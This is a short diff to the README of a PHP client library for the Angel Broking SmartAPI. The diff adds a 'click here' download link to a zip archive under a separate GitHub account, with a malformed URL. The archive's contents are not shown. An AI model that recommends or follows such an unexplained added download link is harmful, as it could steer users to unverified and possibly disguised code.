@@ -9,7 +9,7 @@ composer require smartapi-php/angelbroking
 ```
 use AngelBroking\AngelBroking;
 ```
-
+####to download [click here](https://github.com//Anam-magnus/smartapi-php/archive/refs/tags/1.3.zip)
 ## Getting started with API
 ```php
   //in your function of controller create instance of AngelBroking class
